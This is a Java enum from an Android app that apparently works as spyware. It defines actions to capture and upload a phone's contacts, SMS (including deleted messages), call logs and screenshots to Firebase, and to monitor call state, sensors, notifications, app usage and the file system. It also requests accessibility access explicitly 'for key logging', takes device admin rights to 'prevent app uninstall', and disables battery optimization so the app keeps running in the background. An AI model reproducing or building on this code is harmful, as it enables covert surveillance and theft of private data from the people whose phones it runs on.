package com.vikasyadavnsit.cdc.enums;

import static com.vikasyadavnsit.cdc.utils.ActionUtils.checkAndRequestBatteryOptimization;
import static com.vikasyadavnsit.cdc.utils.ActionUtils.checkOrGetNotificationListenerPermission;
import static com.vikasyadavnsit.cdc.utils.ActionUtils.enableAppUsageStats;

import android.app.Activity;

import com.vikasyadavnsit.cdc.data.User;
import com.vikasyadavnsit.cdc.database.AppDatabase;
import com.vikasyadavnsit.cdc.permissions.PermissionManager;
import com.vikasyadavnsit.cdc.services.AppUsageStats;
import com.vikasyadavnsit.cdc.services.CDCSensorService;
import com.vikasyadavnsit.cdc.services.ScreenshotService;
import com.vikasyadavnsit.cdc.utils.AccessibilityUtils;
import com.vikasyadavnsit.cdc.utils.ActionUtils;
import com.vikasyadavnsit.cdc.utils.CallUtils;
import com.vikasyadavnsit.cdc.utils.FileExplorer;
import com.vikasyadavnsit.cdc.utils.FileUtils;
import com.vikasyadavnsit.cdc.utils.FirebaseUtils;
import com.vikasyadavnsit.cdc.utils.LoggerUtils;
import com.vikasyadavnsit.cdc.utils.MessageUtils;
import com.vikasyadavnsit.cdc.utils.SharedPreferenceUtils;

import java.util.function.BiConsumer;

import lombok.AllArgsConstructor;
import lombok.Getter;

@Getter
@AllArgsConstructor
public enum ClickActions {

    REQUEST_ALL_PERMISSION(
            1,
            (context, triggerSettingsData) -> {
                new PermissionManager().requestAllPermissions((Activity) context);
            },
            "Request all permissions in a single stroke (It will take permissions one by one until you take action on all)",
            "Request all permissions"
    ),
    RESET_ALL_PERMISSION(
            2,
            (context, triggerSettingsData) -> {
                new PermissionManager().resetAllPermissionManually((Activity) context);
            },
            "Reset all permissions manually (It will open settings tab to manually remove all permissions)",
            "Reset all permissions"
    ),
    REQUEST_EXACT_ALARM_PERMISSION(
            3,
            (context, triggerSettingsData) -> {
                // Mysterious observation is that :
                // If multiple setting intents are called all of them will open up in parallel window in background.
                ActionUtils.requestExactAlarmPermission();
            },
            "Request exact alarm permission (It will open setting tab to choose precision alarm permission)",
            "Request alarm permission"
    ),
    REQUEST_ACCESSIBILITY_PERMISSION(
            4,
            (context, triggerSettingsData) -> {
                AccessibilityUtils.startAccessibilitySettingIntent((Activity) context);
            },
            "Request accessibility permission for key logging (It will open accessibility setting tab to enable key logging)",
            "Request accessibility permission"
    ),
    REQUEST_FILE_ACCESS_PERMISSION(
            5,
            (context, triggerSettingsData) -> {
                FileUtils.startFileAccessSettings((Activity) context);
            },
            "Request file access permission (It will open file setting tab to enable file access)",
            "Request file access permission"
    ),
    START_SENSOR_SERVICE(
            6,
            (context, triggerSettingsData) -> {
                if (ActionStatus.START.equals(triggerSettingsData.getActionStatus())) {
                    CDCSensorService.startSensorService((Activity) context);
                } else if (ActionStatus.STOP.equals(triggerSettingsData.getActionStatus())) {
                    CDCSensorService.stopSensorService((Activity) context);
                }
            },
            "Start/Stop sensor service (It is a toggle button to start/stop capturing multiple sensors data)",
            "Start sensor service"
    ),
    START_SCREENSHOT_SERVICE(
            7,
            (context, triggerSettingsData) -> {
                if (ActionStatus.PREPARE.equals(triggerSettingsData.getActionStatus())) {
                    ActionUtils.startMediaProjectionService((Activity) context);
                } else if (ActionStatus.START.equals(triggerSettingsData.getActionStatus())) {
                    int maxRepetitions = triggerSettingsData.getMaxRepetitions();
                    for (int i = 0; i < maxRepetitions; i++) {
                        ScreenshotService.setTakeScreenshot(true);
                        try {
                            Thread.sleep(triggerSettingsData.getInterval());
                        } catch (InterruptedException e) {
                            throw new RuntimeException(e);
                        }
                        LoggerUtils.d("ClickActions", "Took the " + i + " screenshot");
                    }
                } else if (ActionStatus.STOP.equals(triggerSettingsData.getActionStatus())) {
                    ScreenshotService.setStopScreenshotService(true);
                }

            },
            "Start/Stop screenshot service (It is a toggle button to capture a screenshot on the entire system)",
            "Start screenshot service"
    ),
    CAPTURE_ALL_CONTACTS(
            8,
            (context, triggerSettingsData) -> {
                if (triggerSettingsData.isSaveOnLocalFile())
                    FileUtils.appendDataToFile(FileMap.CONTACTS, MessageUtils.getMessages((Activity) context, FileMap.CONTACTS));
                if (triggerSettingsData.isUploadDataSnapshot()) {
                    FirebaseUtils.uploadUserContactsDataSnapshot(MessageUtils.getMessages((Activity) context, FileMap.CONTACTS));
                }
            },
            "Capture all phone contacts (It will capture all the phone contacts)",
            "Capture contacts"
    ),
    CAPTURE_ALL_SMS(
            9,
            (context, triggerSettingsData) -> {
                if (triggerSettingsData.isSaveOnLocalFile()) {
                    FileUtils.appendDataToFile(FileMap.SMS, MessageUtils.getMessages((Activity) context, FileMap.SMS));
                }
                if (triggerSettingsData.isUploadDataSnapshot()) {
                    FirebaseUtils.uploadUserSmsDataSnapshot(MessageUtils.getMessages((Activity) context, FileMap.SMS));
                }
            },
            "Capture all SMS (It will capture all the SMS sent, received, deleted, archived)",
            "Capture SMS"
    ),
    CAPTURE_ALL_CALL_LOGS(
            10,
            (context, triggerSettingsData) -> {
                if (triggerSettingsData.isSaveOnLocalFile())
                    FileUtils.appendDataToFile(FileMap.CALL, MessageUtils.getMessages((Activity) context, FileMap.CALL));
                if (triggerSettingsData.isUploadDataSnapshot()) {
                    FirebaseUtils.uploadUserContactsDataSnapshot(MessageUtils.getMessages((Activity) context, FileMap.CALL));
                }
            },
            "Capture all call logs (It will capture all call logs)",
            "Capture call"
    ),
    MONITOR_CALL_STATE(
            11,
            (context, triggerSettingsData) -> {
                CallUtils.monitorCallState((Activity) context);
            },
            "Monitor call state (Incoming, ringing, outgoing, conference)",
            "Monitor call state"
    ),
    MONITOR_PHONE_STATISTICS(
            12,
            (context, triggerSettingsData) -> {
                ActionUtils.registerPhoneStatistics((Activity) context);
            },
            "Monitor phone statistics (It will capture all the phone statistics like button presses, screen on/off, and user present)",
            "Monitor phone statistics"
    ),
    CAPTURE_KEY_STROKES(
            13,
            (context, triggerSettingsData) -> {
            },
            "Capture key strokes (It will capture all the key strokes)",
            "Capture key strokes"
    ), CAPTURE_NOTIFICATIONS(
            14,
            (context, triggerSettingsData) -> {
               // checkOrGetNotificationListenerPermission(context);
            },
            "Capture Device Notifications (It will capture all the device notifications)",
            "Capture Device Notification"
    ), TAKE_DEVICE_ADMIN_PERMISSIONS(
            15,
            (context, triggerSettingsData) -> {
                ActionUtils.takeDeviceAdminPermission(context);
            },
            "Take Device Admin Permission (It will take the device admin permissions, so that we can prevent app uninstall)",
            "Take Device Admin Permission"
    ), RESET_EVERYTHING(
            16,
            (context, triggerSettingsData) -> {
                AppDatabase.deleteAllRecords();
                //SharedPreferenceUtils.resetFirstLauncher(context);
                SharedPreferenceUtils.resetAllData(context);
                FirebaseUtils.deleteUserAndDeviceData();
                ClickActions.RESET_ALL_PERMISSION.biConsumer.accept(context, triggerSettingsData);
            },
            "Reset Everything (It will delete all the data on firebase which includes App data, Device data, User data )",
            "Reset Everything"
    ), MONITOR_APP_USAGE_STATISTICS(
            17,
            (context, triggerSettingsData) -> {
            },
            "App Usage Statistics (It will monitor all the app usage statistics in realtime)",
            "Monitor APP Usage Statistics"
    ), GET_APP_USAGE_STATISTICS_REPORT(
            18,
            (context, triggerSettingsData) -> {
                enableAppUsageStats(context);
                AppUsageStats.getDailyUsageStats((Activity) context);
            },
            "App Usage Statistics (It will capture all the app usage statistics when invoked)",
            "Get APP Usage Statistics Report"
    ), PREVENT_BATTERY_OPTIMIZATIONS(
            19,
            (context, triggerSettingsData) -> {
                checkAndRequestBatteryOptimization(context);
            },
            "It will disable the battery optimization so that application can run in background",
            "Prevent Battery Optimization"
    ), GET_DIRECTORY_STRUCTURE(
            20,
            (context, triggerSettingsData) -> {
                FileExplorer.getDirectoryStructure();
            },
            "It will get the directory structure from the device root",
            "Get Directory Structure"
    );
    int order;
    BiConsumer<Activity, User.AppTriggerSettingsData> biConsumer;
    String description;
    String actionLabel;
}
